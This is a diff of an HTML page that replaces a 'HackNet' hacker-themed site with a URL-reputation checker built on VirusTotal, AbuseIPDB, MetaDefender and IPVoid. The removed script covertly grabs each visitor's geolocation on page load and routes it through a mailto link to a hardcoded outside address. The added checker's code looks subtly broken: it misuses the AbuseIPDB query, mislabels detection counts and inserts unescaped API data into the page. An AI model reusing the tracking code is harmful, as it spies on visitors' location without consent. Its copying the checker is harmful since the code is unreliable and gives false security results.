@@ -3,89 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HackNet: Unleash Your Inner Hacker</title>
-    <style>
-        /* Your CSS styles */
-    </style>
+    <title>URL Integrity Checker</title>
 </head>
 <body>
-    <!-- Navigation Bar -->
-    <nav>
-        <ul>
-            <li><a href="#home">Home</a></li>
-            <li><a href="#about">About</a></li>
-            <li><a href="#services">Services</a></li>
-            <li><a href="#blog">Blog</a></li>
-            <li><a href="#contact">Contact</a></li>
-        </ul>
-    </nav>
+    <h1>URL Integrity Checker</h1>
+    <form id="url-form">
+        <label for="url-input">Enter URL:</label>
+        <input type="text" id="url-input" required>
+        <button type="submit">Check</button>
+    </form>
+    <div id="result-container"></div>
 
-    <!-- Home Page -->
-    <section id="home">
-        <h1>Welcome to HackNet</h1>
-        <p>Become a master hacker and protect the digital world!</p>
-        <!-- Real-time Hack-O-Meter -->
-        <div id="hack-o-meter">Real-time Hack-O-Meter: <span id="hack-count" class="success">0</span></div>
-        <!-- Latest Hacking News -->
-        <div id="latest-news">
-            <h2>Latest Hacking News</h2>
-            <ul id="news-list">
-                <!-- Populate this list dynamically using JavaScript -->
-            </ul>
-        </div>
-        <!-- Random Joke -->
-        <div id="random-joke">
-            <h2>Random Joke</h2>
-            <p id="joke-text">Loading joke...</p>
-            <button onclick="getDarkHumorJoke()">Get Joke</button>
-        </div>
-        <!-- Interactive Console -->
-        <div id="interactive-console">
-            <h2>Interactive Console</h2>
-            <textarea id="console-output" rows="10" cols="50" readonly></textarea><br>
-            <input type="text" id="console-input">
-            <button onclick="executeCommand()">Execute</button>
-        </div>
-        <!-- Games -->
-        <div id="games">
-            <h2>Games</h2>
-            <p>Coming soon...</p>
-        </div>
-    </section>
-
-    <!-- JavaScript to send user location via email -->
+    <!-- JavaScript -->
     <script>
-        // Function to capture user location and send email
-        function sendUserLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    const locationData = {
-                        latitude: latitude,
-                        longitude: longitude
-                    };
+        const form = document.getElementById('url-form');
+        const resultContainer = document.getElementById('result-container');
 
-                    // Send location data via email
-                    const emailBody = JSON.stringify(locationData);
-                    const emailAddress = 'lasofet272@picdv.com';
-                    const subject = 'User Location';
-                    const mailtoLink = `mailto:${emailAddress}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(emailBody)}`;
-
-                    // Open default email client to send email
-                    window.location.href = mailtoLink;
-                }, error => {
-                    console.error('Error getting user location:', error);
-                    alert('Failed to get location.');
-                });
-            } else {
-                console.error('Geolocation is not supported by this browser.');
-                alert('Geolocation is not supported.');
+        form.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const url = document.getElementById('url-input').value.trim();
+            resultContainer.innerHTML = '<p>Checking...</p>';
+            try {
+                const result = await checkURLIntegrity(url);
+                displayResult(result);
+            } catch (error) {
+                resultContainer.innerHTML = `<p>Error: ${error.message}</p>`;
             }
+        });
+
+        async function checkURLIntegrity(url) {
+            // Call VirusTotal API
+            const virusTotalResponse = await fetch(`https://www.virustotal.com/api/v3/urls/${encodeURIComponent(url)}`, {
+                headers: {
+                    'x-apikey': 'YOUR_VIRUSTOTAL_API_KEY'
+                }
+            });
+            if (!virusTotalResponse.ok) {
+                throw new Error('Failed to check with VirusTotal');
+            }
+            const virusTotalData = await virusTotalResponse.json();
+
+            // Call Abused IP API
+            const abusedIPResponse = await fetch(`https://api.abuseipdb.com/api/v2/check?url=${encodeURIComponent(url)}`, {
+                headers: {
+                    'Key': 'YOUR_ABUSED_IP_API_KEY'
+                }
+            });
+            if (!abusedIPResponse.ok) {
+                throw new Error('Failed to check with Abused IP');
+            }
+            const abusedIPData = await abusedIPResponse.json();
+
+            // Call Metadefender API
+            const metadefenderResponse = await fetch(`https://api.metadefender.com/v4/url/${encodeURIComponent(url)}`, {
+                headers: {
+                    'apikey': 'YOUR_METADEFENDER_API_KEY'
+                }
+            });
+            if (!metadefenderResponse.ok) {
+                throw new Error('Failed to check with Metadefender');
+            }
+            const metadefenderData = await metadefenderResponse.json();
+
+            // Call IPVoid API
+            const ipvoidResponse = await fetch(`https://www.ipvoid.com/ip-blacklist-check/api/${encodeURIComponent(url)}/`, {
+                method: 'GET',
+                headers: {
+                    'Accept': 'application/json'
+                }
+            });
+            if (!ipvoidResponse.ok) {
+                throw new Error('Failed to check with IPVoid');
+            }
+            const ipvoidData = await ipvoidResponse.json();
+
+            return {
+                virusTotal: virusTotalData.data.attributes.last_analysis_stats,
+                abusedIP: abusedIPData.data,
+                metadefender: metadefenderData,
+                ipvoid: ipvoidData
+            };
         }
 
-        // Call the function to send user location via email on page load
-        window.onload = sendUserLocation;
+        function displayResult(result) {
+            let html = '<h2>Result</h2>';
+            html += '<h3>VirusTotal</h3>';
+            html += `<p>Detection ratio: ${result.virusTotal.harmless}/${result.virusTotal.malicious}</p>`;
+            html += '<h3>Abused IP</h3>';
+            html += '<ul>';
+            result.abusedIP.forEach(item => {
+                html += `<li>${item.ipAddress}: ${item.abuseConfidenceScore}% confidence</li>`;
+            });
+            html += '</ul>';
+            html += '<h3>Metadefender</h3>';
+            html += `<p>Scan result: ${result.metadefender.scan_results.scan_all_result_i}</p>`;
+            html += '<h3>IPVoid</h3>';
+            html += `<p>Blacklist status: ${result.ipvoid.blacklists}</p>`;
+            resultContainer.innerHTML = html;
+        }
     </script>
 </body>
 </html>
